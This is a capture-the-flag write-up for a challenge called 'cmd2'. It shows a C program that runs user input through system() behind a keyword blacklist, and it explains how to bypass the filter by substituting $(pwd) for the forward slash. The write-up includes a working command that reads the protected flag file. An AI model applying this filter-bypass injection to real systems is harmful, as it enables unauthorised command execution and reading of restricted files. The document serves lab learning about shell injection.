# cmd2

The home folder of this challenge contains the following:

```
$ ls -l  
total 20
-r-xr-sr-x 1 root cmd2_pwn 8794 Dec 21  2015 cmd2
-rw-r--r-- 1 root root      586 Dec 21  2015 cmd2.c
-r--r----- 1 root cmd2_pwn   30 Jul 14  2015 flag
```

### cmd2.c
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```
In this challenge, we have an updated blacklist of words and symbols. Setting the `PATH` variable is not an option anymore, because the `=` character is blacklisted. The most problematic blacklisted character is the forward slash `/`, because we need that character to execute programs ('./program'), if they are not defined in the `PATH` variable. This also includes the execution of self-written scripts, where you can execute whatever you want without words being blacklisted. Therefore it is important to somehow insert the `/` symbol in our command.

There are only a few commands available when the `PATH` is empty and when you cannot use the forward-slash. One of those commands is `pwd`. `pwd` return the absolute path of the current directory. The idea is to `cd` to the root folder, and execute `pwd`, which returns `/`. That is also exactly the character that we need in our command! `$(pwd)` will insert the result of executing the `pwd` command in place.

To solve this challenge, we navigate to the root directory and execute our self-constructed command with `/` replaced with `$(pwd)`. Because we want that the shell executes `$(pwd)` on the moment that the working directory is set to the root directory, we need to escape the `$` symbol to prevent that `$(pwd)` will be executed before entering `./cmd2`.

```
$ ./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)*"
cd ..; cd ..; $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*
[truncated]
FuN_w1th_5h3ll_v4riabl3s_haha
```
